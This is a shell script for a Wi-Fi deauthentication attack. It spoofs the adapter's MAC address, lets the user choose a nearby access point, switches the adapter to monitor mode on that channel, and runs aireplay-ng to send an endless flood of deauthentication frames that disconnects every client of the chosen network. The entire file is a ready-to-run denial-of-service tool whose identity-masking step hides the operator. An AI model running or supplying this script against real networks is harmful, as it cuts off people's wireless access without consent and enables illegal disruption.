#!/bin/sh

# This script scanfs for available APs, then prompts the user
# to select one from a list, deauthenticating users from the selected
# AP

return_to_default() {
	airmon-ng stop "$INTERFACE"
	iwconfig "$INTERFACE" channel auto
	ifconfig "$INTERFACE" up
}


trap return_to_default EXIT

# Turn selected interface into monitor mode
export INTERFACE
INTERFACE="$(ifconfig | grep -o -P '\w+:\s' | sed 's/:\ *//g' | dmenu -i -p 'Select interface:')"

# Check for errors
if [ -z "$INTERFACE" ]; then
	echo "No interface selected!"
	exit 1
fi

# Bring the selected interface down to randomly spoof the mac address
./macchange.sh "$INTERFACE"

## Select the Access Point to attack
SELECTED_AP="$(./pick_ap.sh "$INTERFACE" | sed 's/,/\ /g')"
ATTACK_BSSID="$(echo "$SELECTED_AP" | awk '{print $1}')"
CHANNEL="$(echo "$SELECTED_AP" | awk '{print $(NF-1)}')"

# Prepare the adapter for deauthentication
iwconfig "$INTERFACE" channel "$CHANNEL"
airmon-ng start "$INTERFACE"
mon="mon"
INTERFACE="$INTERFACE$mon"

# Deauthenticate
echo "Sending deauth packages."
aireplay-ng -D -a "$ATTACK_BSSID" -0 0 "$INTERFACE"
